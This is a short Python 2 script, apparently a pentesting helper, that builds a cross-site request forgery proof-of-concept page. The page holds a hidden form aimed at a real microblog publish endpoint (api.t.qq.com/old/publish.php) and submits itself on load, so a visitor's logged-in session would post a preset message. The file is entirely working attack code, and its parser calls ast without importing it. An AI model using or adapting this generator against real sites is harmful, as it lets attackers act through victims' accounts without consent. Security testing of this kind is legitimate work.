import re
import urlparse
import datetime

def penetools_csrf_semitester(request):
    url = 'http://api.t.qq.com/old/publish.php'
    params = query_split(request)
    url_components =urlparse.urlparse(url)
    filepath = url_components[1] + url_components[2].replace('/','_') + '_' + str(datetime.datetime.now())[:19].replace('-','').replace(' ','').replace(':','') + '.html'
    html_file = open(filepath,'w')
    html_file.write('''<form action=\"''' + url + '''" method="post">\n''')
    for key,value in params.iteritems():
        html_file.write('''<input type="hidden" name="%s" value="%s"/>''' % (key,value))
    html_file.write('''</form>\n<script>alert(1);document.forms[0].submit();</script>''')
    html_file.close()
    
    
    
def query_split(postdata):
    print postdata
    if re.search(r'(\{.*\})',postdata) != None:
        params = ast.literal_eval(postdata)
    else:
        params = urlparse.parse_qs(postdata,keep_blank_values=1)
        for key in params:
            params[key] = params[key][0]
    print params
    return params

if __name__ == '__main__':
    request = 'content=%23%E6%88%91%E7%88%B1%E9%97%AE%E7%BC%96%E8%BE%91%23%20%40xubinchen&startTime=1478506274192'
    penetools_csrf_semitester(request)